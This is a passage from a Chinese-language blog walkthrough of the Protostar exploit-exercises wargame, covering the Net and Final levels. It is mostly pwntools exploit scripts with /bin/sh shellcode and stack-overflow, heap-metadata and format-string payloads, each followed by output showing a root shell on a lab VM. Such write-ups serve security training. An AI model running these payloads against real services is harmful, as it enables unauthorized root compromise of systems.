</span><span style="color:#748aa6;">print </span><span>r.</span><span style="color:#d0dfe6;">recv</span><span>()
</span></code></pre>
<h1 id="net-1">Net 1</h1>
<pre data-lang="python" style="background-color:#14191f;color:#aec2e0;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#748aa6;">from </span><span>pwn </span><span style="color:#748aa6;">import </span><span style="color:#6ee2ff;">*
</span><span style="color:#748aa6;">import </span><span>struct
</span><span>
</span><span>r </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">remote</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">192.168.116.137</span><span style="color:#516a88;">&quot;</span><span>, </span><span style="color:#6ee2ff;">2998</span><span>)
</span><span>s </span><span style="color:#748aa6;">= </span><span>r.</span><span style="color:#d0dfe6;">recv</span><span>()
</span><span style="color:#516a88;"># print s
</span><span>num </span><span style="color:#748aa6;">= </span><span>struct.</span><span style="color:#d0dfe6;">unpack</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">I</span><span style="color:#516a88;">&quot;</span><span>, s)
</span><span style="color:#516a88;"># print num
</span><span>r.</span><span style="color:#d0dfe6;">sendline</span><span>(</span><span style="font-style:italic;color:#267fb5;">str</span><span>(num[</span><span style="color:#6ee2ff;">0</span><span>]))
</span><span style="color:#748aa6;">print </span><span>r.</span><span style="color:#d0dfe6;">recv</span><span>()
</span></code></pre>
<h1 id="net-2">Net 2</h1>
<pre data-lang="python" style="background-color:#14191f;color:#aec2e0;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#748aa6;">from </span><span>pwn </span><span style="color:#748aa6;">import </span><span style="color:#6ee2ff;">*
</span><span style="color:#748aa6;">import </span><span>struct
</span><span>
</span><span>r </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">remote</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">192.168.116.137</span><span style="color:#516a88;">&quot;</span><span>, </span><span style="color:#6ee2ff;">2997</span><span>)
</span><span>num </span><span style="color:#748aa6;">= </span><span style="color:#6ee2ff;">0
</span><span style="color:#748aa6;">for </span><span>i </span><span style="color:#748aa6;">in </span><span style="color:#267fb5;">range</span><span>(</span><span style="color:#6ee2ff;">0</span><span>, </span><span style="color:#6ee2ff;">4</span><span>):
</span><span>  s </span><span style="color:#748aa6;">= </span><span>r.</span><span style="color:#d0dfe6;">recv</span><span>(</span><span style="color:#6ee2ff;">4</span><span>)
</span><span>  num </span><span style="color:#748aa6;">+= </span><span style="font-style:italic;color:#267fb5;">int</span><span>(struct.</span><span style="color:#d0dfe6;">unpack</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">&lt;I</span><span style="color:#516a88;">&quot;</span><span>, s)[</span><span style="color:#6ee2ff;">0</span><span>])
</span><span>num </span><span style="color:#748aa6;">&amp;= </span><span style="color:#6ee2ff;">0xffffffff
</span><span>r.</span><span style="color:#d0dfe6;">sendline</span><span>(</span><span style="color:#d0dfe6;">p32</span><span>(num))
</span><span style="color:#748aa6;">print </span><span>r.</span><span style="color:#d0dfe6;">recv</span><span>()
</span></code></pre>
<h1 id="final-0">Final 0</h1>
<p>首先用栈溢出获得core file，然后objdump获得buffer起始地址，因为gets对\x00读取并没问题，直接用\x00截断，shellcode，junk，retaddr</p>
<pre data-lang="python" style="background-color:#14191f;color:#aec2e0;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#748aa6;">from </span><span>pwn </span><span style="color:#748aa6;">import </span><span style="color:#6ee2ff;">*
</span><span style="color:#748aa6;">import </span><span>struct
</span><span>
</span><span>r </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">remote</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">192.168.116.137</span><span style="color:#516a88;">&quot;</span><span>, </span><span style="color:#6ee2ff;">2995</span><span>)
</span><span>shellcode </span><span style="color:#748aa6;">= </span><span style="color:#516a88;">&#39;</span><span style="color:#4cbbff;">\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80</span><span style="color:#516a88;">&#39;
</span><span>payload </span><span style="color:#748aa6;">= </span><span style="color:#516a88;">&#39;</span><span style="color:#4cbbff;">\x00</span><span style="color:#516a88;">&#39;</span><span style="color:#748aa6;">+ </span><span>shellcode </span><span style="color:#748aa6;">+ </span><span style="color:#516a88;">&#39;</span><span style="color:#4cbbff;">\x90</span><span style="color:#516a88;">&#39;</span><span style="color:#748aa6;">*</span><span>(</span><span style="color:#6ee2ff;">532</span><span style="color:#748aa6;">-</span><span style="color:#267fb5;">len</span><span>(shellcode)</span><span style="color:#748aa6;">-</span><span style="color:#6ee2ff;">1</span><span>)</span><span style="color:#748aa6;">+</span><span style="color:#d0dfe6;">p32</span><span>(</span><span style="color:#6ee2ff;">0xbffffa49</span><span>)
</span><span>r.</span><span style="color:#d0dfe6;">sendline</span><span>(payload)
</span><span>r.</span><span style="color:#d0dfe6;">interactive</span><span>()
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">root@kali:~/Documents/Protostar#</span><span> python final0.py 
</span><span style="color:#d0dfe6;">[+]</span><span> Opening connection to 192.168.116.137 on port 2995: Done
</span><span style="color:#d0dfe6;">[*]</span><span> Switching to interactive mode
</span><span style="color:#d0dfe6;">$</span><span> id
</span><span style="color:#d0dfe6;">uid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">0</span><span>(</span><span style="color:#d0dfe6;">root</span><span>) gid=0(root) </span><span style="color:#d0dfe6;">groups</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">0</span><span>(</span><span style="color:#d0dfe6;">root</span><span>)
</span></code></pre>
<h1 id="final-1">Final 1</h1>
<p>syslog原型为<code>void syslog(int priority, const char *format, ...);</code>看第二个参数名字就懂了吧，查看需要在有权限的情况下看<code>/var/log/syslog</code>文件</p>
<p>然后就是尝试咯</p>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> objdump</span><span style="font-style:italic;color:#95cc5e;"> -tTR</span><span> final1 </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">grep</span><span> puts
</span><span style="color:#d0dfe6;">00000000</span><span>       F </span><span style="color:#748aa6;">*</span><span>UND</span><span style="color:#748aa6;">*</span><span>  00000000              puts@@GLIBC_2.0
</span><span style="color:#d0dfe6;">00000000</span><span>      DF </span><span style="color:#748aa6;">*</span><span>UND</span><span style="color:#748aa6;">*</span><span>  00000000  GLIBC_2.0   puts
</span><span style="color:#d0dfe6;">0804a194</span><span> R_386_JUMP_SLOT   puts
</span><span style="color:#d0dfe6;">$</span><span> objdump</span><span style="font-style:italic;color:#95cc5e;"> -tTR</span><span> final1 </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">grep</span><span> username
</span><span style="color:#d0dfe6;">0804a220</span><span> g     O .bss   00000080              username
</span></code></pre>
<pre data-lang="python" style="background-color:#14191f;color:#aec2e0;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#748aa6;">from </span><span>pwn </span><span style="color:#748aa6;">import </span><span style="color:#6ee2ff;">*
</span><span style="color:#748aa6;">import </span><span>struct
</span><span>
</span><span>shellcode </span><span style="color:#748aa6;">= </span><span style="color:#516a88;">&#39;</span><span style="color:#4cbbff;">\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80</span><span style="color:#516a88;">&#39;
</span><span>ret </span><span style="color:#748aa6;">= </span><span style="color:#6ee2ff;">0x0804a194
</span><span>payload </span><span style="color:#748aa6;">= </span><span>shellcode</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&#39;</span><span style="color:#4cbbff;">\x90</span><span style="color:#516a88;">&#39;</span><span style="color:#748aa6;">*</span><span style="color:#6ee2ff;">2</span><span style="color:#748aa6;">+</span><span style="color:#d0dfe6;">p32</span><span>(ret)</span><span style="color:#748aa6;">+</span><span style="color:#d0dfe6;">p32</span><span>(ret</span><span style="color:#748aa6;">+</span><span style="color:#6ee2ff;">1</span><span>)</span><span style="color:#748aa6;">+</span><span style="color:#d0dfe6;">p32</span><span>(ret</span><span style="color:#748aa6;">+</span><span style="color:#6ee2ff;">2</span><span>)</span><span style="color:#748aa6;">+</span><span style="color:#d0dfe6;">p32</span><span>(ret</span><span style="color:#748aa6;">+</span><span style="color:#6ee2ff;">3</span><span>)</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">%24$01968d</span><span style="color:#516a88;">&#39;</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">%26$hn</span><span style="color:#516a88;">&#39;</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">%24$039452d</span><span style="color:#516a88;">&#39;</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">%24$hn</span><span style="color:#516a88;">&#39;
</span><span>r </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">remote</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">192.168.116.137</span><span style="color:#516a88;">&quot;</span><span>, </span><span style="color:#6ee2ff;">2994</span><span>)
</span><span>r.</span><span style="color:#d0dfe6;">recv</span><span>()
</span><span>r.</span><span style="color:#d0dfe6;">sendline</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">username </span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">+</span><span>payload)
</span><span>r.</span><span style="color:#d0dfe6;">recv</span><span>()
</span><span>r.</span><span style="color:#d0dfe6;">sendline</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">login </span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">+</span><span style="color:#516a88;">&quot; &quot;</span><span style="color:#748aa6;">*</span><span style="color:#6ee2ff;">24</span><span>)
</span><span>r.</span><span style="color:#d0dfe6;">interactive</span><span>()
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">root@kali:~/Documents/Protostar#</span><span> python final1.py 
</span><span style="color:#d0dfe6;">[+]</span><span> Opening connection to 192.168.116.137 on port 2994: Done
</span><span style="color:#d0dfe6;">[*]</span><span> Switching to interactive mode
</span><span style="color:#d0dfe6;">$</span><span> id
</span><span style="color:#d0dfe6;">uid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">0</span><span>(</span><span style="color:#d0dfe6;">root</span><span>) gid=0(root) </span><span style="color:#d0dfe6;">groups</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">0</span><span>(</span><span style="color:#d0dfe6;">root</span><span>)
</span><span>
</span></code></pre>
<h1 id="final-2">Final 2</h1>
<pre data-lang="python" style="background-color:#14191f;color:#aec2e0;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#748aa6;">from </span><span>pwn </span><span style="color:#748aa6;">import </span><span style="color:#6ee2ff;">*
</span><span style="color:#748aa6;">import </span><span>struct
</span><span>
</span><span>shellcode </span><span style="color:#748aa6;">= </span><span style="color:#516a88;">&#39;</span><span style="color:#4cbbff;">\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80</span><span style="color:#516a88;">&#39;
</span><span>
</span><span>r </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">remote</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">192.168.116.137</span><span style="color:#516a88;">&quot;</span><span>, </span><span style="color:#6ee2ff;">2993</span><span>)
</span><span>r.</span><span style="color:#d0dfe6;">send</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">FSRD</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">+ </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">A</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">*</span><span>(</span><span style="color:#6ee2ff;">128</span><span style="color:#748aa6;">-</span><span style="color:#6ee2ff;">4</span><span style="color:#748aa6;">-</span><span style="color:#6ee2ff;">1</span><span>) </span><span style="color:#748aa6;">+ </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/</span><span style="color:#516a88;">&quot;</span><span>)  
</span><span>r.</span><span style="color:#d0dfe6;">sendline</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">FSRD</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">+ </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">ROOT</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">+ </span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\x90</span><span style="color:#516a88;">&quot;</span><span style="color:#748aa6;">*</span><span>(</span><span style="color:#6ee2ff;">128</span><span style="color:#748aa6;">-</span><span style="color:#267fb5;">len</span><span>(shellcode)</span><span style="color:#748aa6;">-</span><span style="color:#6ee2ff;">4</span><span style="color:#748aa6;">-</span><span style="color:#6ee2ff;">4</span><span style="color:#748aa6;">-</span><span style="color:#6ee2ff;">1</span><span style="color:#748aa6;">-</span><span style="color:#6ee2ff;">4</span><span style="color:#748aa6;">-</span><span style="color:#6ee2ff;">4</span><span style="color:#748aa6;">-</span><span style="color:#6ee2ff;">4</span><span style="color:#748aa6;">-</span><span style="color:#6ee2ff;">4</span><span>) </span><span style="color:#748aa6;">+ </span><span>shellcode </span><span style="color:#748aa6;">+ </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">+ </span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\xfc\xff\xff\xff</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">+ </span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\xfc\xff\xff\xff</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">+ </span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\x10\xd4\x04\x08</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">+ </span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\x98\xe0\x04\x08</span><span style="color:#516a88;">&quot; </span><span>)
</span><span>
</span><span>r.</span><span style="color:#d0dfe6;">interactive</span><span>()
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">root@kali:~/Documents/Protostar#</span><span> python final2.py 
</span><span style="color:#d0dfe6;">[+]</span><span> Opening connection to 192.168.116.137 on port 2993: Done
</span><span style="color:#d0dfe6;">[*]</span><span> Switching to interactive mode
</span><span style="color:#d0dfe6;">Process</span><span> OK
</span><span style="color:#d0dfe6;">$</span><span> id
</span><span style="color:#d0dfe6;">uid</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">0</span><span>(</span><span style="color:#d0dfe6;">root</span><span>) gid=0(root) </span><span style="color:#d0dfe6;">groups</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">0</span><span>(</span><span style="color:#d0dfe6;">root</span><span>)
</span><span>
</span></code></pre>

    </div>
  </div>

        </div>

        
        
        <button class="sidebar-toggle left-sidebar-toggle" onclick="openSidebar()">O</button>
        <aside class="sidebar left" name="sidebar">
          
          <div class="sidebar-content-toggle">
            <a name="swith-to-toc-button" class="actived" onclick="switchToTOC()">Table of Content</>
            <a name="swith-to-about-authour-button" onclick="switchToAboutAuthor()">About Author</a>
          </div>
          
          <div class="sidebar-overview"  style="opacity:0;display:none" >
            <div class="site-author" itemprop="author" itemtype="https://schema.org/Person">
              
              <img class="site-author-image" itemprop="image"
                src="https://CSUwangj.github.io/images/avatar.png"
                alt="CSUwangj" />
              
              <p class="site-author-name unselectable">CSUwangj</p>
              <p class="site-author-quote">Just keep in mind that hacking is very rarely in a sequence.</p>
            </div>
            <div class="feed-link">
              
              <a rel="alternate" type="application/rss+xml" title="RSS" href="https://CSUwangj.github.io/rss.xml">
                RSS
              </a>
              
            </div>
            <div class="links-of-author">
              
              <a href="https:&#x2F;&#x2F;github.com&#x2F;CSUwangj" title="Github" class="author-link">
                <i class="fa-brands fa-github"></i>
              </a>
              
              <a href="mailto:CSUwangj@protonmail.com" title="EMail" class="author-link">
                <i class="fa-solid fa-envelope"></i>
              </a>
              
            </div>
            <div class="links-of-blogroll">
              
              <a href="https:&#x2F;&#x2F;wolfbolin.com&#x2F;">WolfBolin</a>
              
              <a href="https:&#x2F;&#x2F;blog.yuki-nagato.com&#x2F;">长门有希</a>
              
              <a href="https:&#x2F;&#x2F;www.porlockz.com&#x2F;">Porlockz</a>
              
              <a href="https:&#x2F;&#x2F;way.lu&#x2F;">Phosphorus</a>
              
              <a href="https:&#x2F;&#x2F;edwardzcn.github.io&#x2F;">Edwardzcn</a>
              
              <a href="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;csu-lmw&#x2F;">吕少</a>
              
              <a href="https:&#x2F;&#x2F;zickshen.github.io&#x2F;">ZickShen</a>
              
            </div>
          </div>
          <div class="sidebar-toc">
          
          <ul>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#stack-0">Stack 0</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#stack-1">Stack 1</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#stack-2">Stack 2</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#stack-3">Stack 3</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#stack-4">Stack 4</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#stack-5">Stack 5</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#stack-6">Stack 6</a>
            
            <ul>
            
            <li>
            <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#solution-1-duplicated-shellcode">solution 1: Duplicated Shellcode</a>
              
              <ul>
              
              <li>
              <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#xun-gen-jiu-di">寻根究底</a>
                
              </li>
              
              </ul>
              
            </li>
            
            <li>
            <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#solution-2-return-to-text">solution 2: Return to .text</a>
              
            </li>
            
            <li>
            <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#solution-3-return-to-libc">solution 3: Return to libc</a>
              
            </li>
            
            <li>
            <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#solution-4-rop-todo">solution 4: ROP（TODO）</a>
              
            </li>
            
            <li>
            <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#can-kao-zi-liao">参考资料</a>
              
            </li>
            
            </ul>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#stack-7">Stack 7</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#format-0">Format 0</a>
            
            <ul>
            
            <li>
            <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#solution-0-stackoverflow">solution 0: stackoverflow</a>
              
            </li>
            
            <li>
            <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#solution-1-format-string">solution 1: format string</a>
              
            </li>
            
            </ul>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#format-1">Format 1</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#format-2">Format 2</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#format-3">Format 3</a>
            
            <ul>
            
            <li>
            <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#solution-0-brute">solution 0: Brute!</a>
              
            </li>
            
            <li>
            <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#solution-1-gentle">solution 1: Gentle</a>
              
            </li>
            
            <li>
            <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#solution-2-more-gentle">solution 2: More gentle</a>
              
            </li>
            
            </ul>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#format-4">Format 4</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#heap-0">Heap 0</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#heap-1">Heap 1</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#heap-2">Heap 2</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#heap-3">Heap 3</a>
            
            <ul>
            
            <li>
            <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#xue-xi-zi-liao">学习资料</a>
              
            </li>
            
            </ul>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#net-0">Net 0</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#net-1">Net 1</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#net-2">Net 2</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#final-0">Final 0</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#final-1">Final 1</a>
            
          </li>
          
          <li>
          <a href="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/#final-2">Final 2</a>
            
          </li>
          
          </ul>
          
          </div>
        </aside>
        
        

      </main>

      
      <footer name="footer">
        <div class="copyright">
          <span item="copyrightYear">© 2018-2022</span>
          <span class="author">CSUwangj</span>
        </div>
        <div class="powered-by">
          Powered by <a href="https://www.getzola.org/">Zola</a> Theme <a href="https://github.com/CSUwangj/DogFood">DogFood</a>
        </div>
      </footer>
      
    </body>

</html>